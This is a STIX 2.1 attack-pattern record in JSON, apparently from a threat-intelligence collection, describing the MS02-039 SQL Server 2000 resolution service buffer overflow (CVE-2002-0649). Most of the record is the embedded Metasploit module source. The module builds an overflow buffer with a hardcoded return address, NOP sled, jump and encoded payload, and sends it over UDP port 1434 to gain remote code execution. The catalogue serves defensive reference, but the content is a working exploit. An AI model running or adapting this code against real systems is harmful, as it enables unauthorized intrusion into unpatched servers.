{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ec8e2cfc-e361-4a61-8be5-1f6c44fc0b22",
    "created": "2024-08-14T16:39:54.065379Z",
    "modified": "2024-08-14T16:39:54.065383Z",
    "name": "MS02-039 Microsoft SQL Server Resolution Overflow",
    "description": " This is an exploit for the SQL Server 2000 resolution service buffer overflow. This overflow is triggered by sending a udp packet to port 1434 which starts with 0x04 and is followed by long string terminating with a colon and a number. This module should work against any vulnerable SQL Server 2000 or MSDE install (pre-SP3).  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/mssql/ms02_039_slammer.rb",
            "external_id": "ms02_039_slammer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2002-0649"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::MSSQL\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS02-039 Microsoft SQL Server Resolution Overflow',\n      'Description'    => %q{\n          This is an exploit for the SQL Server 2000 resolution\n        service buffer overflow. This overflow is triggered by\n        sending a udp packet to port 1434 which starts with 0x04 and\n        is followed by long string terminating with a colon and a\n        number. This module should work against any vulnerable SQL\n        Server 2000 or MSDE install (pre-SP3).\n\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2002-0649'],\n          [ 'OSVDB', '4578'],\n          [ 'BID', '5310'],\n          [ 'MSB', 'MS02-039'],\n\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 512,\n          'BadChars' => \"\\x00\\x3a\\x0a\\x0d\\x2f\\x5c\",\n          'StackAdjustment' => -3500,\n        },\n      'Targets'        =>\n        [\n          [\n            'MSSQL 2000 / MSDE <= SP2',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x42b48774,\n            },\n          ],\n        ],\n      'Platform'       => 'win',\n      'DisclosureDate' => '2002-07-24',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(1434)\n      ])\n  end\n\n\n  def check\n    info = mssql_ping\n    if (info['ServerName'])\n      print_status(\"SQL Server Information:\")\n      info.each_pair { |k,v|\n        print_status(\"   #{k + (\" \" * (15-k.length))} = #{v}\")\n      }\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    connect_udp\n    print_status(sprintf(\"Sending UDP packet with return address 0x%.8x\", target.ret))\n    print_status(\"Execute 'net start sqlserveragent' once access is obtained\");\n\n    # \\x68:888 => push dword 0x3838383a\n    buf = \"\\x04\" + rand_text_english(800, payload_badchars) + \"\\x68:888\"\n\n    # Return to the stack pointer\n    buf[ 97, 4] = [target.ret].pack('V')\n\n    # Which lands right here\n    buf[101, 6] = make_nops(6)\n\n    # Jumps 8 bytes ahead\n    buf[107, 2] = \"\\xeb\\x08\"\n\n    # Write to thread storage space to avoid a crash\n    buf[109, 8] = [0x7ffde0cc, 0x7ffde0cc].pack('VV')\n\n    # And finally into the payload\n    buf[117,payload.encoded.length] = payload.encoded\n\n    udp_sock.put(buf)\n\n    disconnect_udp\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2002-07-24",
    "x_mitre_platforms": [
        "win'"
    ]
}